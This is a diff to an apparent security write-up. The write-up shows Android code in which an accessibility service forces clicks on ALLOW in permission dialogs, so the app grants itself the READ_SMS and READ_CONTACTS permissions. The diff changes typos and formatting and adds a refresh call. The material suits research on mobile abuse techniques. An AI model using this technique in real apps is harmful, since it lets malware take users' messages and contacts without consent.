@@ -19,7 +19,7 @@ emulator, only the second one was "skipped", which is clearly suspicious.
 ### Configuration
 
 The Manifest remains the same, I still ask for **READ_SMS** and **READ_CONTACTS**. However, the configuration file is modified, because we don't need to listen
-for events coming from our app or Settings, and we try to catch `click` events. Furthemore, I added the flag `flagReportViewIds`:
+for events coming from our app or Settings, and we try to catch `click` events. Furthermore, I added the flag `flagReportViewIds`:
 
 > ```xml
 ><accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
@@ -38,19 +38,19 @@ In the main activity, as usual, we try to detect if accessibility service is ena
 
 > ```java
 >@Override
->	protected void onCreate(Bundle savedInstanceState) {
->		super.onCreate(savedInstanceState);
->		String[] perms = getRequestedPermissions(this);
->		if (perms != null && perms.length != 0 && isAccessibilityServiceOn()) {
->			ActivityCompat.requestPermissions(this, perms, 1);
->		}else
->			setContentView(R.layout.activity_main);
->	}
+>protected void onCreate(Bundle savedInstanceState) {
+>	super.onCreate(savedInstanceState);
+>	String[] perms = getRequestedPermissions(this);
+>	if (perms != null && perms.length != 0 && isAccessibilityServiceOn())
+>		ActivityCompat.requestPermissions(this, perms, 1);
+>	else
+>		setContentView(R.layout.activity_main);
+>}
 > ```
 
 and `getRequestedPermissions` returns permissions asked in the Manifest:
 
-> ```
+> ```java
 >private String[] getRequestedPermissions(){
 >	PackageInfo info = null;
 >	try {
@@ -68,8 +68,8 @@ is the asking activity (this one), and the last integer is an identifier, useles
 ### The accessibility service
 
 Once again, the code is simpler, because we don't need to browse through settings and click on certain items. The idea is very simple: for each permission,
-the package manager will display a dialog box, with a short message, a picture, and two buttons: ALLOW and DENY. We try to capture the click on one of these two
-buttons, and force the click on ALLOW. Then, this click will affect the next popup, and the next permission will be granted. Since we cannot ensure that the language
+the package manager will display a dialog box, with a short message, a picture, and two buttons: **ALLOW** and **DENY**. We try to capture the click on one of these two
+buttons, and force the click on **ALLOW**. Then, this click will affect the next popup, and the next permission will be granted. Since we cannot ensure that the language
 of the device is English, we use views' identifiers to know where to click, and which widget has been clicked.
 
 The two interesting widgets have these ids:
@@ -93,6 +93,7 @@ and `true` is returned if the button has been clicked:
 >private boolean parseView(AccessibilityNodeInfo node){
 >	if (node == null)
 >		return false;
+>	node.refresh();
 >	for(int i = 0; i< node.getChildCount(); i++){
 >		if (parseView(node.getChild(i)))
 >			return true;
@@ -110,6 +111,8 @@ and `true` is returned if the button has been clicked:
 >	return false;
 >}
 > ``` 
+
+**NOTE**: the line `node.refresh()` is required, see [here](https://stackoverflow.com/questions/36793154/accessibilityservice-not-returning-view-ids)
 
 ### So what ?
 
